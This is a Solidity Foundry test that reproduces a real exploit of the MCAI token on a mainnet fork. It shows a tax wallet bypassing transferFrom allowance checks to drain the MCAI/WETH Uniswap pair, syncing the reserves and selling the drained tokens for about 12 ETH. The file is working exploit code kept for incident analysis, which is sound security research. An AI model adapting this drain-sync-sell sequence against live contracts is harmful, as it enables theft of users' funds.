// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 12.03 WETH
// Attacker : 0x0C8ecf2BbF9361fa2DD0Bd29ea473FB790aB7fEE
// Attack Contract : 0xdDF062714911A2e59996Eb94A57b7040Ea44309D
// Vulnerable Contract : 0x810B5902CB2ac2Fa63dFE4A6935EA32aED975cc8
// Victim : 0x660a6619574e87d12Ba7Fa3F5679D5D7F587A4fE
// Attack Tx : https://etherscan.io/tx/0xfbe3bc868d555ef617bb1c32d1d8d5ec8b825bf2b4795dd99b47b321f36f3c21

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x810B5902CB2ac2Fa63dFE4A6935EA32aED975cc8#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/409
//
// The MCAI tax wallet bypassed transferFrom allowance accounting, pulled MCAI from the MCAI/WETH Uniswap V2 pair,
// synced the pair at a tiny MCAI reserve, then sold the drained MCAI back through the router for WETH/ETH profit.

address constant ATTACKER = 0x0C8ecf2BbF9361fa2DD0Bd29ea473FB790aB7fEE;
address constant ATTACK_CONTRACT = 0xdDF062714911A2e59996Eb94A57b7040Ea44309D;
address constant MCAI = 0x810B5902CB2ac2Fa63dFE4A6935EA32aED975cc8;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant MCAI_WETH_PAIR = 0x660a6619574e87d12Ba7Fa3F5679D5D7F587A4fE;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 21_720_380;
        vm.createSelectFork("mainnet", forkBlock);
        fundingToken = address(0);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ATTACK_CONTRACT, "MCAI tax wallet");
        vm.label(MCAI, "MCAI");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(MCAI_WETH_PAIR, "MCAI/WETH pair");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 router");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        uint256 attackerBefore = ATTACKER.balance;
        MCAIExploit exploit = new MCAIExploit();

        // step 1: the tax wallet pulls 99.99% of MCAI from the pair without pair approval.
        uint256 pairMcaiBalance = IERC20(MCAI).balanceOf(MCAI_WETH_PAIR);
        uint256 drainAmount = pairMcaiBalance - pairMcaiBalance / 10_000;
        assertEq(IERC20(MCAI).allowance(MCAI_WETH_PAIR, ATTACK_CONTRACT), 0, "pair did not approve tax wallet");

        vm.prank(ATTACK_CONTRACT, ATTACKER);
        IERC20(MCAI).transferFrom(MCAI_WETH_PAIR, address(exploit), drainAmount);

        // step 2: the attacker-originated helper syncs, sells the drained MCAI, and forwards ETH to the EOA.
        vm.prank(ATTACKER, ATTACKER);
        exploit.attack();

        uint256 profit = ATTACKER.balance - attackerBefore;
        assertGt(profit, 11 ether, "ETH profit");
    }
}

contract MCAIExploit {
    function attack() external {
        require(msg.sender == ATTACKER, "only attacker");

        // step 3: sync the pair so reserves record the tiny MCAI balance left behind.
        Uni_Pair_V2(MCAI_WETH_PAIR).sync();

        // step 4: sell the drained MCAI through the router and receive ETH.
        IERC20(MCAI).approve(UNISWAP_V2_ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = MCAI;
        path[1] = WETH_TOKEN;
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER))
            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                IERC20(MCAI).balanceOf(address(this)), 0, path, address(this), block.timestamp
            );

        // step 5: forward the ETH profit to the same receiver used in the trace.
        (bool sent,) = payable(ATTACKER).call{value: address(this).balance}("");
        require(sent, "ETH forwarding failed");
    }

    receive() external payable {}
}
